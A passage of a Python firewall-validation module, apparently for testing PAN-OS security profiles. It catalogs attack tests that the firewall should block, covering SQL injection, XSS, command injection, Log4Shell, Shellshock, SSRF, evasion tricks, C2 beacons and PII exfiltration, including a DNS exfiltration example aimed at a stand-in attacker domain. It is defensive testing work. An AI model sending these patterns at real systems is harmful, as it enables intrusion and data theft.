"""Security Testing Engine — validates PAN-OS NGFW security profiles.

Runs known attack patterns through the firewall and checks whether they are
blocked (PASS) or pass through (FAIL). Covers Vulnerability Protection,
Anti-Virus/Threat Prevention, and URL Filtering.
"""
import io
import json
import logging
import os
import socket
import ssl
import struct
import subprocess
import threading
import time
import uuid
import zipfile
from dataclasses import dataclass, field
from typing import Dict, List, Optional
from urllib.parse import quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('security')

# ─── Data Structures ────────────────────────────────────────

@dataclass
class SecurityTestCase:
    id: str
    name: str
    category: str           # web_attacks | malware_threats | url_filtering
    description: str
    expected_action: str    # "block"
    panos_feature: str      # PAN-OS feature that should catch this
    threat_id: str = ''     # PAN-OS Threat ID (e.g., "41000 — SQL Injection")
    # Custom pattern fields
    custom: bool = False
    payload: str = ''
    method: str = 'GET'
    headers: dict = field(default_factory=dict)
    target_path: str = '/echo'

@dataclass
class SecurityTestResult:
    test_id: str
    test_name: str
    category: str
    expected_action: str
    actual_result: str      # blocked | passed_through | error | pending
    verdict: str            # PASS | FAIL | ERROR
    response_code: int
    detail: str
    panos_feature: str
    threat_id: str = ''
    timestamp: float = 0.0
    # Enriched fields
    description: str = ''
    payload: str = ''
    url: str = ''
    method: str = ''
    expected_behavior: str = ''
    response_body_snippet: str = ''
    response_headers: dict = field(default_factory=dict)
    verdict_explanation: str = ''

# ─── Expected Behavior Map ──────────────────────────────────

EXPECTED_BEHAVIOR = {
    'sqli_union': 'Firewall Vulnerability Protection profile should detect UNION SELECT pattern in the HTTP request and reset/block the connection',
    'sqli_or': 'Firewall should detect OR-based SQL injection bypass pattern and block the request',
    'sqli_drop': 'Firewall should detect destructive DROP TABLE SQL statement and block the request',
    'xss_script': 'Firewall should detect <script> tag in URL parameter and block reflected XSS attempt',
    'xss_img': 'Firewall should detect IMG tag with onerror JavaScript handler and block the XSS payload',
    'xss_svg': 'Firewall should detect SVG element with onload handler and block the XSS payload',
    'cmdi_cat': 'Firewall should detect OS command injection pattern (semicolon + system command) and block',
    'cmdi_pipe': 'Firewall should detect pipe-based command injection and block the request',
    'cmdi_backtick': 'Firewall should detect backtick command execution and block the request',
    'path_traversal': 'Firewall should detect directory traversal sequences (../../) targeting sensitive files',
    'log4shell': 'Firewall should detect JNDI lookup string ${jndi:ldap://...} in HTTP headers (CVE-2021-44228)',
    'eicar_http': 'Firewall Anti-Virus profile should detect EICAR test file signature in HTTP response and block the download',
    'eicar_https': 'Firewall must have SSL Decryption enabled to inspect HTTPS payload. Anti-Virus should detect EICAR in decrypted stream',
    'eicar_zip': 'Firewall Anti-Virus should detect EICAR inside ZIP archive (requires archive inspection enabled)',
    'c2_callback': 'Firewall Anti-Spyware profile should detect C2 beacon callback pattern (base64 payload + suspicious headers)',
    'malicious_ua': 'Firewall Anti-Spyware should detect known malware User-Agent string (CobaltStrike)',
    'url_malware': 'Firewall URL Filtering profile should block access to URLs categorized as malware in PAN-DB',
    'url_phishing': 'Firewall URL Filtering should block URLs categorized as phishing in PAN-DB',
    'url_hacking': 'Firewall URL Filtering should block URLs categorized as hacking in PAN-DB',
    'url_proxy': 'Firewall URL Filtering should block URLs categorized as proxy-avoidance/anonymizers in PAN-DB',
    # DNS Attacks
    'dns_tunnel': 'Firewall Anti-Spyware profile should detect anomalous DNS queries with long, encoded subdomain labels indicative of DNS tunneling (iodine, dnscat2)',
    'dns_dga': 'Firewall Anti-Spyware should detect high-entropy, algorithmically-generated domain names characteristic of DGA-based botnet C2 communication',
    'dns_rebind': 'Firewall should detect DNS rebinding patterns where domains resolve to private IP ranges, potentially bypassing same-origin policy',
    # Protocol Abuse
    'ssh_bruteforce': 'Firewall Vulnerability Protection / Zone Protection should detect rapid SSH login failures and trigger brute-force protection signatures',
    'ftp_bounce': 'Firewall should detect FTP PORT commands targeting internal IP addresses, a technique used for network reconnaissance (FTP bounce scan)',
    'http_smuggle': 'Firewall should detect ambiguous Content-Length / Transfer-Encoding headers used in HTTP request smuggling attacks',
    'slowloris': 'Firewall or Zone Protection profile should detect slow-rate DoS patterns (Slowloris) where connections send partial headers to exhaust server resources',
    # File-Based Threats
    'pdf_js': 'Firewall Anti-Virus or File Blocking profile should detect and block PDF files containing embedded JavaScript, commonly used for exploitation',
    'office_macro': 'Firewall Anti-Virus or File Blocking should detect OLE2 documents with VBA macros (AutoOpen), a primary malware delivery vector',
    'pe_download': 'Firewall File Blocking or Anti-Virus profile should detect PE executable (MZ/PE header) downloads over HTTP and block based on file type policy',
    # Advanced Web Attacks
    'xxe': 'Firewall Vulnerability Protection should detect XML External Entity (XXE) patterns including DOCTYPE and ENTITY declarations targeting file:// or other URI schemes',
    'ssrf': 'Firewall should detect Server-Side Request Forgery (SSRF) attempts targeting internal IPs, cloud metadata endpoints (169.254.169.254), or private network ranges',
    'ssti': 'Firewall should detect Server-Side Template Injection patterns ({{...}}, ${...}) that attempt to execute code through template engines like Jinja2 or Freemarker',
    'ldap_injection': 'Firewall should detect LDAP injection metacharacters and filter manipulation patterns that attempt to bypass LDAP-based authentication or query data',
    'xpath_injection': 'Firewall should detect XPath injection patterns that attempt to manipulate XML queries for authentication bypass or data extraction',
    'crlf_injection': 'Firewall should detect CRLF injection (%0d%0a) in HTTP headers that attempt to inject arbitrary headers or split HTTP responses for cache poisoning',
    'open_redirect': 'Firewall should detect open redirect patterns where user-supplied URLs redirect to external malicious domains, commonly used in phishing attacks',
    'blind_sqli': 'Firewall Vulnerability Protection should detect time-based blind SQL injection patterns like WAITFOR DELAY, SLEEP(), and BENCHMARK() used for data exfiltration',
    'deserialization': 'Firewall should detect serialized object payloads (Java rO0AB, .NET AAEAAAD, PHP a:) that could lead to remote code execution via insecure deserialization',
    'shellshock': 'Firewall Vulnerability Protection should detect Shellshock (CVE-2014-6271) pattern "() { :;}" in HTTP headers targeting Bash CGI handlers',
    'file_inclusion': 'Firewall should detect Remote File Inclusion (RFI) patterns with URL parameters pointing to external files (http://, ftp://) for remote code execution',
    'info_disclosure': 'Firewall should detect access attempts to common information disclosure paths (phpinfo.php, .env, .git/) that expose sensitive server configuration',
    # SSL Decryption Validation
    'ssl_sqli': 'Firewall SSL Decryption policy must decrypt this HTTPS session. Vulnerability Protection should then detect SQL injection in the decrypted payload. If this test FAILs, verify Decryption Policy and Decryption Profile are configured and applied to the security rule',
    'ssl_xss': 'Firewall SSL Decryption must decrypt HTTPS traffic. Vulnerability Protection should detect XSS <script> tag in the decrypted request. FAIL indicates decryption is not active or profile is not attached',
    'ssl_eicar': 'Firewall SSL Decryption must decrypt the HTTPS download. Anti-Virus should detect the EICAR test file in the decrypted stream. This is the definitive test for SSL decryption — if EICAR passes through HTTPS, decryption is not working',
    'ssl_c2': 'Firewall SSL Decryption must decrypt HTTPS. Anti-Spyware should detect the C2 beacon callback pattern in the decrypted payload. FAIL means either decryption or Anti-Spyware profile is not active',
    'ssl_cmdi': 'Firewall SSL Decryption must decrypt HTTPS. Vulnerability Protection should detect OS command injection in the decrypted request parameters',
    # App-ID Validation
    'appid_ssh_on_443': 'Firewall App-ID should identify SSH protocol on port 443 (normally HTTPS). If a policy blocks SSH regardless of port, the connection should be reset. PASS confirms App-ID identifies applications by behavior, not port',
    'appid_http_on_8080': 'Firewall App-ID should identify HTTP (web-browsing) on a non-standard port. If policies allow web-browsing, the connection succeeds and App-ID correctly identified the application',
    'appid_ftp_on_443': 'Firewall App-ID should identify FTP protocol on port 443. If a policy blocks FTP, the connection should be reset regardless of port. PASS confirms port-independent application identification',
    'appid_dns_on_80': 'Firewall App-ID should identify DNS protocol sent over TCP port 80. If policies restrict DNS to port 53, the connection should be blocked. PASS confirms App-ID detects DNS regardless of port',
    # Data Exfiltration / DLP
    'exfil_credit_card': 'Firewall Data Filtering profile should detect credit card number patterns (Luhn-valid numbers) in the HTTP POST body and block the exfiltration attempt',
    'exfil_ssn': 'Firewall Data Filtering profile should detect Social Security Number patterns (XXX-XX-XXXX) in the HTTP POST body and block the data exfiltration',
    'exfil_bulk_data': 'Firewall Data Filtering profile should detect bulk PII data (mixed credit cards, SSNs, emails) in the HTTP POST body and block the exfiltration',
    'exfil_dns_data': 'Firewall Anti-Spyware profile should detect data exfiltration via DNS subdomain encoding — hex-encoded data embedded in DNS query labels',
    'exfil_http_headers': 'Firewall Data Filtering profile should detect sensitive data patterns (credit cards, SSNs) hidden in custom HTTP headers',
    # Evasion Techniques
    'evasion_double_encode': 'Firewall should normalize double-URL-encoded payloads (%2527 → %27 → \') and detect the underlying SQL injection. Requires URL decode normalization in Vulnerability Protection profile',
    'evasion_null_byte': 'Firewall should detect path traversal even with null byte injection (%00) used to bypass file extension checks. Requires proper null byte handling in the IPS engine',
    'evasion_chunked': 'Firewall should reassemble chunked Transfer-Encoding and detect SQL injection split across HTTP chunks. Requires HTTP protocol decoder to reassemble before signature matching',
    'evasion_unicode': 'Firewall should decode Unicode escape sequences (\\u003c = <) and detect the underlying XSS attack. Requires Unicode normalization in the IPS engine',
    'evasion_case_mixing': 'Firewall should perform case-insensitive matching and detect SQL injection keywords regardless of character case (SeLeCt, UnIoN). Standard IPS behavior',
    'evasion_comment_insert': 'Firewall should detect SQL injection even with comment insertion (UN/**/ION) used to evade simple pattern matching. Requires SQL syntax-aware inspection',
    # Expanded C2
    'c2_cobalt_strike': 'Firewall Anti-Spyware profile should detect Cobalt Strike malleable C2 beacon patterns including characteristic URI paths, MSIE User-Agent, and encoded session cookies',
    'c2_metasploit': 'Firewall Anti-Spyware should detect Metasploit reverse HTTP handler patterns including Trident User-Agent, short URI paths, and binary POST payloads',
    'c2_dns_c2': 'Firewall Anti-Spyware should detect C2 communication over DNS TXT queries with encoded data in subdomain labels, characteristic of tools like dnscat2 and Cobalt Strike DNS beacon',
    'c2_icmp_tunnel': 'Firewall Anti-Spyware or Zone Protection should detect data exfiltration over ICMP echo requests with oversized or encoded payloads, characteristic of tools like icmpsh and ptunnel',
    'c2_http_beacon': 'Firewall Anti-Spyware should detect periodic HTTP beacon patterns with rotating User-Agents, encoded payloads, and consistent callback intervals characteristic of C2 frameworks',
    # Credential Phishing
    'phish_http_login': 'Firewall Credential Phishing Prevention should detect corporate credential submission to an untrusted HTTP login form and block the POST request',
    'phish_https_login': 'Firewall Credential Phishing Prevention (with SSL Decryption) should detect credential submission over HTTPS to an untrusted login form',
    'phish_js_exfil': 'Firewall URL Filtering or Credential Phishing Prevention should detect credentials being exfiltrated via URL query parameters (simulating JavaScript keylogger)',
    'phish_hidden_form': 'Firewall Credential Phishing Prevention should detect credential harvesting via hidden form fields with redirect to external collection domain',
    # Encrypted DNS
    'doh_google': 'Firewall App-ID should identify and block DNS-over-HTTPS (DoH) traffic to Google DNS (dns.google), preventing encrypted DNS bypass of DNS Security policies',
    'doh_cloudflare': 'Firewall App-ID should identify and block DNS-over-HTTPS (DoH) traffic to Cloudflare DNS (cloudflare-dns.com), preventing DNS policy bypass',
    'doh_exfil': 'Firewall should detect data exfiltration via DNS-over-HTTPS — hex-encoded data sent as subdomains in DoH queries bypassing standard DNS inspection',
    'dot_query': 'Firewall App-ID should identify and block DNS-over-TLS (DoT) traffic, preventing encrypted DNS from bypassing DNS Security and logging policies',
}

# ─── Test Catalog ───────────────────────────────────────────

WEB_ATTACK_TESTS = [
    SecurityTestCase('sqli_union', 'SQL Injection — UNION SELECT',
        'web_attacks', 'UNION-based SQL injection in URL query parameter. Sends a crafted SQL UNION SELECT statement that attempts to extract usernames and passwords from the database. This is one of the most common SQL injection techniques used to exfiltrate data.',
        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection: UNION SELECT'),
    SecurityTestCase('sqli_or', 'SQL Injection — OR 1=1',
        'web_attacks', 'Boolean-based SQL injection via OR clause. Injects an always-true condition (OR 1=1) to bypass authentication or retrieve all records from a database table.',
        'block', 'Vulnerability Protection', threat_id='41001 — SQL Injection: Boolean-Based'),
    SecurityTestCase('sqli_drop', 'SQL Injection — DROP TABLE',
        'web_attacks', 'Destructive SQL injection with DROP TABLE statement. Attempts to delete an entire database table, causing data loss and service disruption.',
        'block', 'Vulnerability Protection', threat_id='41002 — SQL Injection: DROP Statement'),
    SecurityTestCase('xss_script', 'XSS — Script Tag',
        'web_attacks', 'Reflected XSS via <script> tag in URL parameter. Injects JavaScript code that executes in the victim\'s browser when the server reflects the payload back in the response.',
        'block', 'Vulnerability Protection', threat_id='41501 — Cross-Site Scripting: Script Tag'),
    SecurityTestCase('xss_img', 'XSS — IMG onerror',
        'web_attacks', 'Reflected XSS via IMG tag with onerror handler. Uses a broken image tag to trigger JavaScript execution through the onerror event handler, bypassing basic script tag filters.',
        'block', 'Vulnerability Protection', threat_id='41502 — Cross-Site Scripting: Event Handler'),
    SecurityTestCase('xss_svg', 'XSS — SVG onload',
        'web_attacks', 'Reflected XSS via SVG element with onload handler. Exploits SVG\'s onload event to execute JavaScript, a technique often used to bypass XSS filters.',
        'block', 'Vulnerability Protection', threat_id='41503 — Cross-Site Scripting: SVG Element'),
    SecurityTestCase('cmdi_cat', 'Command Injection — cat /etc/passwd',
        'web_attacks', 'OS command injection reading sensitive file. Appends a semicolon and system command to read /etc/passwd, attempting to extract user account information from the server.',
        'block', 'Vulnerability Protection', threat_id='42001 — OS Command Injection'),
    SecurityTestCase('cmdi_pipe', 'Command Injection — Pipe',
        'web_attacks', 'OS command injection using pipe operator. Uses the pipe (|) to chain a directory listing command, attempting to enumerate the server\'s file system.',
        'block', 'Vulnerability Protection', threat_id='42001 — OS Command Injection'),
    SecurityTestCase('cmdi_backtick', 'Command Injection — Backtick',
        'web_attacks', 'OS command injection via backtick execution. Uses backtick syntax to execute the id command, revealing the server process\'s user identity and privileges.',
        'block', 'Vulnerability Protection', threat_id='42001 — OS Command Injection'),
    SecurityTestCase('path_traversal', 'Path Traversal — ../../etc/passwd',
        'web_attacks', 'Directory traversal to read /etc/passwd. Uses relative path sequences (../) to escape the web root and access sensitive system files.',
        'block', 'Vulnerability Protection', threat_id='42501 — Directory Traversal'),
    SecurityTestCase('log4shell', 'Log4Shell — JNDI Lookup',
        'web_attacks', 'Log4j RCE via JNDI lookup string in HTTP header (CVE-2021-44228). Sends the ${jndi:ldap://...} payload in HTTP headers, exploiting the Log4j vulnerability to trigger remote code execution.',
        'block', 'Vulnerability Protection', threat_id='93054 — Apache Log4j RCE (CVE-2021-44228)'),
    SecurityTestCase('xxe', 'XXE — XML External Entity',
        'web_attacks', 'XML External Entity injection. Sends a crafted XML payload with a DOCTYPE declaration referencing an external entity (/etc/passwd), attempting server-side file disclosure.',
        'block', 'Vulnerability Protection', threat_id='43001 — XML External Entity Injection'),
    SecurityTestCase('ssrf', 'SSRF — Server-Side Request Forgery',
        'web_attacks', 'Sends a request with a URL parameter pointing to an internal metadata endpoint (169.254.169.254), attempting to access cloud instance metadata or internal services.',
        'block', 'Vulnerability Protection', threat_id='43501 — Server-Side Request Forgery'),
    SecurityTestCase('ssti', 'SSTI — Server-Side Template Injection',
        'web_attacks', 'Sends template expression payloads ({{7*7}}, ${7*7}) that execute on the server if improperly sandboxed. Tests detection of Jinja2/Twig/Freemarker injection patterns.',
        'block', 'Vulnerability Protection', threat_id='44001 — Server-Side Template Injection'),
    SecurityTestCase('ldap_injection', 'LDAP Injection',
        'web_attacks', 'Injects LDAP filter metacharacters to modify directory queries. Sends payload with wildcard and boolean operators to extract or bypass LDAP authentication.',
        'block', 'Vulnerability Protection', threat_id='44501 — LDAP Injection'),
    SecurityTestCase('xpath_injection', 'XPath Injection',
        'web_attacks', 'Injects XPath query syntax to manipulate XML data queries. Sends boolean-based XPath injection to bypass authentication or extract XML document data.',
        'block', 'Vulnerability Protection', threat_id='44502 — XPath Injection'),
    SecurityTestCase('crlf_injection', 'CRLF / Header Injection',
        'web_attacks', 'Injects carriage return and line feed characters (%0d%0a) into HTTP headers to add arbitrary headers or split the response, enabling cache poisoning or XSS.',
        'block', 'Vulnerability Protection', threat_id='45001 — HTTP Header Injection'),
    SecurityTestCase('open_redirect', 'Open Redirect',
        'web_attacks', 'Sends a request with a redirect parameter pointing to an external malicious site. Firewalls should detect URL redirect manipulation patterns.',
        'block', 'Vulnerability Protection', threat_id='45501 — Open Redirect'),
    SecurityTestCase('blind_sqli', 'Blind SQL Injection — Time-Based',
        'web_attacks', 'Sends a time-based blind SQL injection payload using WAITFOR DELAY or SLEEP() to detect SQL injection vulnerabilities without direct output.',
        'block', 'Vulnerability Protection', threat_id='41003 — SQL Injection: Time-Based Blind'),
    SecurityTestCase('deserialization', 'Insecure Deserialization',
        'web_attacks', 'Sends a serialized Java object payload (rO0AB...) in the request body, targeting insecure deserialization vulnerabilities in Java-based applications.',
        'block', 'Vulnerability Protection', threat_id='46001 — Java Deserialization Attack'),
    SecurityTestCase('shellshock', 'Shellshock — CVE-2014-6271',
        'web_attacks', 'Sends the Shellshock (Bash bug) exploit payload in HTTP headers. The () { :;} pattern exploits CVE-2014-6271 to achieve remote code execution on vulnerable CGI servers.',
        'block', 'Vulnerability Protection', threat_id='36729 — Shellshock Bash RCE (CVE-2014-6271)'),
    SecurityTestCase('file_inclusion', 'Remote File Inclusion (RFI)',
        'web_attacks', 'Sends a URL parameter referencing a remote PHP file for inclusion. If the server processes this, it could execute arbitrary remote code.',
        'block', 'Vulnerability Protection', threat_id='46501 — Remote File Inclusion'),
    SecurityTestCase('info_disclosure', 'Information Disclosure — phpinfo',
        'web_attacks', 'Attempts to access common information disclosure paths (phpinfo.php, .env, .git/config) that expose sensitive server configuration and credentials.',
        'block', 'Vulnerability Protection', threat_id='47001 — Information Disclosure'),
]

MALWARE_TESTS = [
    SecurityTestCase('eicar_http', 'EICAR Download — HTTP',
        'malware_threats', 'Download EICAR anti-malware test file over HTTP (port 9999). The EICAR test string is a standardized 68-byte file recognized by all anti-virus products as a test threat. Downloaded over unencrypted HTTP for easy inspection.',
        'block', 'Anti-Virus', threat_id='275470248 — EICAR Test File'),
    SecurityTestCase('eicar_https', 'EICAR Download — HTTPS',
        'malware_threats', 'Download EICAR test file over HTTPS (port 443). Same EICAR file but over encrypted HTTPS. Firewall must have SSL Decryption policy enabled to inspect the encrypted payload and detect the threat.',
        'block', 'Anti-Virus', threat_id='275470248 — EICAR Test File (SSL)'),
    SecurityTestCase('eicar_zip', 'EICAR in ZIP — HTTP',
        'malware_threats', 'Download EICAR inside ZIP archive over HTTP. Tests whether the firewall can inspect compressed archives and detect threats inside ZIP files. Requires archive inspection to be enabled in the Anti-Virus profile.',
        'block', 'Anti-Virus', threat_id='275470248 — EICAR Test File (Archive)'),
    SecurityTestCase('c2_callback', 'C2 Callback Pattern',
        'malware_threats', 'HTTP POST with encoded data mimicking C2 beacon callback. Sends a base64-encoded payload with suspicious headers (old IE User-Agent, hex session cookie, suspicious X-Request-ID) that mimic command-and-control beacon traffic.',
        'block', 'Anti-Spyware', threat_id='86500 — C2 Beacon Callback'),
    SecurityTestCase('malicious_ua', 'Malicious User-Agent',
        'malware_threats', 'HTTP request with known malware User-Agent string. Sends a request with "Wget/1.0 (CobaltStrike)" User-Agent, mimicking traffic from a well-known penetration testing/attack framework.',
        'block', 'Anti-Spyware', threat_id='86501 — Suspicious User-Agent String'),
]

URL_FILTERING_TESTS = [
    SecurityTestCase('url_malware', 'URL Category — Malware',
        'url_filtering', 'Access URL in PAN-DB malware category. Attempts to visit a URL that PAN-DB classifies as hosting malware. URL Filtering policy should block access to this category.',
        'block', 'URL Filtering', threat_id='PAN-DB: malware'),
    SecurityTestCase('url_phishing', 'URL Category — Phishing',
        'url_filtering', 'Access URL in PAN-DB phishing category. Attempts to visit a URL classified as a phishing site. URL Filtering should block access to prevent credential theft.',
        'block', 'URL Filtering', threat_id='PAN-DB: phishing'),
    SecurityTestCase('url_hacking', 'URL Category — Hacking',
        'url_filtering', 'Access URL in PAN-DB hacking category. Attempts to visit a URL categorized as hacking/computer security tools. URL Filtering should block based on policy.',
        'block', 'URL Filtering', threat_id='PAN-DB: hacking'),
    SecurityTestCase('url_proxy', 'URL Category — Proxy/Anonymizer',
        'url_filtering', 'Access URL in PAN-DB proxy-avoidance category. Attempts to visit a proxy/anonymizer site used to bypass security controls. URL Filtering should block to prevent policy evasion.',
        'block', 'URL Filtering', threat_id='PAN-DB: proxy-avoidance'),
]

DNS_ATTACK_TESTS = [
    SecurityTestCase('dns_tunnel', 'DNS Tunneling Detection',
        'dns_attacks', 'Sends DNS queries with suspiciously long subdomain labels containing base64-encoded data, mimicking DNS tunneling tools like iodine or dnscat2. The firewall Anti-Spyware profile should detect anomalous DNS query patterns.',
        'block', 'Anti-Spyware', threat_id='86600 — Suspicious DNS Query (Tunneling)'),
    SecurityTestCase('dns_dga', 'DGA Domain Detection',
        'dns_attacks', 'Queries multiple algorithmically-generated domain names that mimic Domain Generation Algorithm (DGA) patterns used by malware botnets. The firewall should detect the entropy and pattern of DGA domains.',
        'block', 'Anti-Spyware', threat_id='86601 — DGA Domain Query'),
    SecurityTestCase('dns_rebind', 'DNS Rebinding Attempt',
        'dns_attacks', 'Queries domains that could be used in DNS rebinding attacks, where a domain alternates between external and private IP addresses to bypass same-origin policy and access internal resources.',
        'block', 'Anti-Spyware', threat_id='86602 — DNS Rebinding Attempt'),
]

PROTOCOL_ABUSE_TESTS = [
    SecurityTestCase('ssh_bruteforce', 'SSH Brute Force Pattern',
        'protocol_abuse', 'Performs rapid successive SSH login attempts with different credentials, simulating a brute-force attack. The firewall should detect the high rate of failed authentication attempts and trigger a brute-force protection signature.',
        'block', 'Vulnerability Protection', threat_id='40015 — SSH Brute Force'),
    SecurityTestCase('ftp_bounce', 'FTP Bounce Scan',
        'protocol_abuse', 'Attempts to use FTP PORT command to redirect data connections to internal IP addresses, simulating an FTP bounce scan used for internal network reconnaissance.',
        'block', 'Vulnerability Protection', threat_id='30003 — FTP Bounce Scan'),
    SecurityTestCase('http_smuggle', 'HTTP Request Smuggling',
        'protocol_abuse', 'Sends an HTTP request with ambiguous Content-Length and Transfer-Encoding headers to exploit parsing differences between firewall and server, potentially smuggling malicious requests.',
        'block', 'Vulnerability Protection', threat_id='41600 — HTTP Request Smuggling'),
    SecurityTestCase('slowloris', 'Slowloris DoS Pattern',
        'protocol_abuse', 'Opens an HTTP connection and sends partial headers very slowly, keeping the connection alive without completing the request. This Slowloris-style pattern should be detected by the firewall as a denial-of-service attempt.',
        'block', 'Vulnerability Protection', threat_id='40039 — Slowloris DoS Attack'),
]

FILE_THREAT_TESTS = [
    SecurityTestCase('pdf_js', 'PDF with Embedded JavaScript',
        'file_threats', 'Downloads a PDF file containing embedded JavaScript (app.alert action). The firewall Anti-Virus or file blocking profile should detect and block PDFs with active content as they are commonly used for exploitation.',
        'block', 'Anti-Virus', threat_id='52001 — PDF with JavaScript'),
    SecurityTestCase('office_macro', 'Office Document with VBA Macro',
        'file_threats', 'Downloads a file with OLE2 compound document header and VBA macro signatures (AutoOpen). The firewall should detect and block files containing macro code, as they are a primary vector for malware delivery.',
        'block', 'Anti-Virus', threat_id='52002 — Office Macro Document'),
    SecurityTestCase('pe_download', 'PE Executable Download — HTTP',
        'file_threats', 'Downloads a Windows PE executable file (MZ/PE header) over HTTP. The firewall file blocking or Anti-Virus profile should detect the executable file type and block the download based on policy.',
        'block', 'Anti-Virus', threat_id='File Blocking: PE executable'),
]

SSL_DECRYPTION_TESTS = [
    SecurityTestCase('ssl_sqli', 'SQL Injection over HTTPS',
        'ssl_decryption', 'Sends SQL injection payload over HTTPS. If the firewall is decrypting SSL, Vulnerability Protection will detect and block the attack in the decrypted stream. If this passes through, SSL decryption is likely not enabled.',
        'block', 'SSL Decryption + Vulnerability Protection', threat_id='41000 — SQL Injection (SSL)'),
    SecurityTestCase('ssl_xss', 'XSS over HTTPS',
        'ssl_decryption', 'Sends Cross-Site Scripting payload over HTTPS. Requires SSL decryption to inspect the encrypted payload and detect the <script> tag.',
        'block', 'SSL Decryption + Vulnerability Protection', threat_id='41501 — Cross-Site Scripting (SSL)'),
    SecurityTestCase('ssl_eicar', 'EICAR Download over HTTPS',
        'ssl_decryption', 'Downloads the EICAR anti-malware test file over HTTPS. This is the definitive SSL decryption test — the firewall must decrypt the HTTPS session to detect the EICAR signature in the response body.',
        'block', 'SSL Decryption + Anti-Virus', threat_id='275470248 — EICAR Test File (SSL Decryption)'),
    SecurityTestCase('ssl_c2', 'C2 Callback over HTTPS',
        'ssl_decryption', 'Sends C2 beacon callback pattern over HTTPS with base64-encoded payload and suspicious headers. Anti-Spyware must inspect the decrypted stream to detect the C2 pattern.',
        'block', 'SSL Decryption + Anti-Spyware', threat_id='86500 — C2 Beacon (SSL)'),
    SecurityTestCase('ssl_cmdi', 'Command Injection over HTTPS',
        'ssl_decryption', 'Sends OS command injection payload over HTTPS. Vulnerability Protection must inspect the decrypted request to detect the injection pattern.',
        'block', 'SSL Decryption + Vulnerability Protection', threat_id='42001 — OS Command Injection (SSL)'),
]

APPID_VALIDATION_TESTS = [
    SecurityTestCase('appid_ssh_on_443', 'SSH Traffic on HTTPS Port (443)',
        'appid_validation', 'Sends SSH protocol banner on port 443 (normally HTTPS). Firewall App-ID should identify the traffic as SSH regardless of port and enforce application-based policy.',
        'block', 'App-ID', threat_id='App-ID: SSH on port 443'),
    SecurityTestCase('appid_http_on_8080', 'HTTP on Non-Standard Port (8082)',
        'appid_validation', 'Sends standard HTTP request on port 8082. Firewall App-ID should identify it as web-browsing regardless of port number.',
        'block', 'App-ID', threat_id='App-ID: web-browsing'),
    SecurityTestCase('appid_ftp_on_443', 'FTP Traffic on HTTPS Port (443)',
        'appid_validation', 'Sends FTP protocol commands on port 443. Firewall App-ID should identify the traffic as FTP, not HTTPS, and enforce FTP-specific policies.',
        'block', 'App-ID', threat_id='App-ID: FTP on port 443'),
    SecurityTestCase('appid_dns_on_80', 'DNS Query on HTTP Port (80)',
        'appid_validation', 'Sends a DNS A query over TCP port 80. Firewall App-ID should identify the traffic as DNS protocol regardless of the port and apply DNS-specific policies.',
        'block', 'App-ID', threat_id='App-ID: DNS on port 80'),
]

DATA_EXFILTRATION_TESTS = [
    SecurityTestCase('exfil_credit_card', 'Credit Card Number Exfiltration',
        'data_exfiltration', 'POSTs multiple Luhn-valid credit card numbers (Visa, Mastercard, Amex) to an external server. Data Filtering profile should detect credit card patterns and block the exfiltration.',
        'block', 'Data Filtering', threat_id='Data Filtering: Credit Card Numbers'),
    SecurityTestCase('exfil_ssn', 'Social Security Number Exfiltration',
        'data_exfiltration', 'POSTs Social Security Numbers in XXX-XX-XXXX format to an external server. Data Filtering profile should detect SSN patterns and block the data leak.',
        'block', 'Data Filtering', threat_id='Data Filtering: SSN'),
    SecurityTestCase('exfil_bulk_data', 'Bulk PII Data Exfiltration',
        'data_exfiltration', 'POSTs a large payload containing mixed PII — credit cards, SSNs, email addresses, phone numbers. Tests Data Filtering detection threshold for bulk sensitive data.',
        'block', 'Data Filtering', threat_id='Data Filtering: Bulk PII'),
    SecurityTestCase('exfil_dns_data', 'DNS-Based Data Exfiltration',
        'data_exfiltration', 'Encodes sensitive data as hex in DNS subdomain queries (e.g., 4111111111111111.exfil.attacker.com). Anti-Spyware should detect DNS exfiltration patterns.',
        'block', 'Anti-Spyware', threat_id='86600 — DNS Data Exfiltration'),
    SecurityTestCase('exfil_http_headers', 'Header-Based Data Exfiltration',
        'data_exfiltration', 'Hides sensitive data (credit cards, SSNs) in custom HTTP headers (X-Session-Data, X-Debug-Info). Tests whether Data Filtering inspects headers, not just body.',
        'block', 'Data Filtering', threat_id='Data Filtering: Header Exfil'),
]

EVASION_TECHNIQUE_TESTS = [
    SecurityTestCase('evasion_double_encode', 'Double URL Encoding Evasion',
        'evasion_techniques', 'SQL injection payload with double URL encoding (%2527 instead of %27). Tests whether the firewall performs recursive URL decoding before signature matching.',
        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection (Double Encoded)'),
    SecurityTestCase('evasion_null_byte', 'Null Byte Injection Evasion',
        'evasion_techniques', 'Path traversal with null byte (%00) appended to bypass file extension checks (../../etc/passwd%00.jpg). Tests null byte handling in the IPS engine.',
        'block', 'Vulnerability Protection', threat_id='42501 — Directory Traversal (Null Byte)'),
    SecurityTestCase('evasion_chunked', 'Chunked Transfer Encoding Evasion',
        'evasion_techniques', 'SQL injection payload split across multiple HTTP chunks using Transfer-Encoding: chunked. Tests whether the firewall reassembles chunks before inspection.',
        'block', 'Vulnerability Protection', threat_id='41600 — HTTP Evasion (Chunked)'),
    SecurityTestCase('evasion_unicode', 'Unicode Escape Evasion',
        'evasion_techniques', 'XSS payload using Unicode escape sequences (\\u003cscript\\u003e instead of <script>). Tests Unicode normalization in the IPS engine.',
        'block', 'Vulnerability Protection', threat_id='41501 — XSS (Unicode Encoded)'),
    SecurityTestCase('evasion_case_mixing', 'Case Randomization Evasion',
        'evasion_techniques', 'SQL injection with randomized character case (SeLeCt, UnIoN). Tests case-insensitive signature matching in Vulnerability Protection.',
        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection (Case Mixed)'),
    SecurityTestCase('evasion_comment_insert', 'SQL Comment Insertion Evasion',
        'evasion_techniques', 'SQL injection with inline comments between keywords (UN/**/ION SE/**/LECT). Tests whether the firewall strips SQL comments before matching.',
        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection (Comment Insertion)'),
]

C2_EXPANDED_TESTS = [
    SecurityTestCase('c2_cobalt_strike', 'Cobalt Strike Beacon',
        'malware_threats', 'Simulates Cobalt Strike malleable C2 beacon callback with characteristic URI pattern (/submit.php), MSIE User-Agent, and base64-encoded session cookie.',
        'block', 'Anti-Spyware', threat_id='86502 — Cobalt Strike C2 Beacon'),
